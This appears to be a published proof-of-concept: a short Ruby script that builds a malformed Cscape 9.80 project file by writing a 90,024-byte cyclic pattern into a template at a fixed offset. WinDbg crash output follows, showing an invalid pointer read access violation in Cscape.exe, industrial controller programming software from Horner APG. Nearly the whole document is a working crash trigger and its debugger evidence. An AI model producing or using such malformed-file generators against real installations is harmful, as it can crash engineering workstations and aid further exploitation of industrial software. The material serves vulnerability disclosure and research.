#!/usr/bin/env ruby
# Cscape 9.80 AccessViolation when reading in a malformed file.

require 'rex'

fd = File.open("template.csp","rb")
new_bin = fd.read(fd.stat.size)
fd.close

data = Rex::Text.pattern_create(90024)

blah = new_bin
blah[2624 + 4, data.size] = data

x = File.new("fuzz.csp","wb")
x.write(blah)
x.close

__END__
LURE_BUCKET_ID:  NULL_POINTER_READ_00000041_INVALID_POINTER_READ_00000041_c0000005_Cscape.exe!Unknown

BUCKET_ID:  APPLICATION_FAULT_NULL_POINTER_READ_00000041_INVALID_POINTER_READ_00000041_Cscape+5e0d5

Followup: MachineOwner
---------

0:000> lmvm Cscape
start    end        module name
00400000 00db3000   Cscape   C (export symbols)       C:\Program Files\Cscape\Cscape.exe
    Loaded symbol image file: C:\Program Files\Cscape\Cscape.exe
    Image path: Cscape.exe
    Image name: Cscape.exe
    Timestamp:        Fri Jul 28 04:12:03 2017 (597B0DF3)
    CheckSum:         00000000
    ImageSize:        009B3000
    File version:     9.80.27.1
    Product version:  9.80.0.0
    File flags:       0 (Mask 3F)
    File OS:          4 Unknown Win32
    File type:        1.0 App
    File date:        00000000.00000000
    Translations:     0409.04b0
    CompanyName:      Horner APG, LLC
    ProductName:      Horner APG, LLC Cscape
    InternalName:     Cscape
    OriginalFilename: Cscape.exe
    ProductVersion:   9, 80, 0, 0
    FileVersion:      9, 80, 27, 1
    PrivateBuild:     9, 80, 27, 1
    SpecialBuild:     9, 80, 27, 1
    FileDescription:  Cscape
    LegalCopyright:   Copyright © 1994 - 2017 Horner APG, LLC
    LegalTrademarks:  Cscape
    Comments:         Cscape

